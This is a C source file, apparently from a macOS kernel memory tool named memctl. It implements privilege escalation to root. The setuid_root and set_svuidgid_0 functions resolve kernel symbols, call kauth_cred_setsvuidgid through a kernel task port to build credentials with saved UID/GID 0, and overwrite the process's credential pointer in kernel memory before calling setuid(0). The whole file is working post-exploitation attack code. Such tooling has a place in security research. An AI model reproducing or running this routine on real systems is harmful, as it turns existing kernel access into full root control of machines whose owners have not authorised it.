#include "memctl/privilege_escalation.h"

#include "memctl/core.h"
#include "memctl/kernel.h"
#include "memctl/kernel_call.h"
#include "memctl/kernel_memory.h"
#include "memctl/memctl_error.h"

#include <mach/mach_vm.h>

#define PROC_DUMP_SIZE 128

static bool
set_svuidgid_0() {
	bool success = false;
	// Resolve the symbols we'll need.
	kext_result kxr;
#define RESOLVE(symbol)								\
	kaddr_t symbol;								\
	kxr = kernel_symbol(#symbol, &symbol, NULL);				\
	if (kxr != KEXT_SUCCESS) {						\
		error_internal("could not find symbol %s", #symbol);		\
		goto fail_0;							\
	}
	RESOLVE(_current_proc);
	RESOLVE(_kauth_cred_proc_ref);
	RESOLVE(_kauth_cred_setsvuidgid);
	RESOLVE(_kauth_cred_unref);
#undef RESOLVE
#define ERROR_CALL(symbol)	error_internal("could not call %s", #symbol)
	// Get the current process.
	kaddr_t proc;
	bool succ = kernel_call(&proc, sizeof(proc), _current_proc, 0, NULL);
	if (!succ) {
		ERROR_CALL(_current_proc);
		goto fail_0;
	}
	// Dump the contents of the proc struct.
	kword_t proc_data[PROC_DUMP_SIZE];
	size_t readsize = sizeof(proc_data);
	kernel_io_result kio = kernel_read_unsafe(proc, &readsize, proc_data, 0, NULL);
	if (kio != KERNEL_IO_SUCCESS) {
		error_internal("could not read from proc struct");
		goto fail_0;
	}
	const unsigned max_idx = readsize / sizeof(kword_t);
	// Add a reference to the current process's credentials and get a pointer to the
	// credentials.
	kaddr_t cred;
	succ = kernel_call(&cred, sizeof(cred), _kauth_cred_proc_ref, 1, &proc);
	if (!succ) {
		ERROR_CALL(_kauth_cred_proc_ref);
		goto fail_0;
	}
	// Get the index of the credentials in the proc struct.
	unsigned cred_idx;
	for (cred_idx = 0; cred_idx < max_idx; cred_idx++) {
		if (proc_data[cred_idx] == cred) {
			goto found_cred;
		}
	}
	// The cred wasn't found in the proc struct. We have no idea where the cred is, so
	// unfortunately we can't pass a pointer to the cred to kauth_cred_unref. We've added an
	// extra reference on this cred, but this just means that the cred won't be cleaned up.
	error_internal("could not find credentials pointer in proc struct");
	goto fail_0;
found_cred:;
	// Calculate the address of the cred pointer in the proc struct.
	kaddr_t proc_cred_ptr = proc + cred_idx * sizeof(kword_t);
	// Create a new credentials structure based on our current one that has saved UID/GID 0.
	kaddr_t cred0;
	kword_t svuid_args[3] = { cred, 0, 0 };
	succ = kernel_call(&cred0, sizeof(cred0), _kauth_cred_setsvuidgid, 3, svuid_args);
	if (!succ) {
		// Leak the credential.
		ERROR_CALL(_kauth_cred_setsvuidgid);
		goto fail_0;
	}
	// Allocate memory in which we can store the old cred pointer so that we can call
	// kauth_cred_unref.
	mach_vm_address_t cred_ptr;
	kern_return_t kr = mach_vm_allocate(kernel_task, &cred_ptr, sizeof(cred),
			VM_FLAGS_ANYWHERE);
	if (kr != KERN_SUCCESS) {
		// Leak the credential.
		error_internal("mach_vm_allocate failed: %s", mach_error_string(kr));
		goto fail_0;
	}
	// Copy in the old cred pointer.
	kio = kernel_write_word(kernel_write_unsafe, cred_ptr, cred, sizeof(cred), 0);
	if (kio != KERNEL_IO_SUCCESS) {
		// Leak the credential.
		error_internal("could not write old credentials pointer to kernel memory");
		goto fail_1;
	}
	// Replace our old unprivileged credentials with our new privileged credentials.
	kio = kernel_write_word(kernel_write_unsafe, proc_cred_ptr, cred0, sizeof(cred0), 0);
	if (kio != KERNEL_IO_SUCCESS) {
		// Leak the credential.
		error_internal("could not replace process credentials");
		goto fail_1;
	}
	// Remove a reference on the old credentials.
	(void)kernel_call(NULL, 0, _kauth_cred_unref, 1, &cred_ptr);
	success = true;
fail_1:
	// Deallocate the cred_ptr memory.
	mach_vm_deallocate(kernel_task, cred_ptr, sizeof(cred));
fail_0:
	return success;
}

bool
setuid_root() {
	assert(kernel_task != MACH_PORT_NULL);
	// Check if we're already root.
	seteuid(0);
	setuid(0);
	setgid(0);
	if (getuid() == 0) {
		return true;
	}
	// Set our saved UID/GID to root.
	if (!set_svuidgid_0()) {
		return false;
	}
	seteuid(0);
	setuid(0);
	setgid(0);
	if (getuid() == 0) {
		return true;
	}
	error_internal("could not elevate privileges after setting saved UID to 0");
	return false;
}
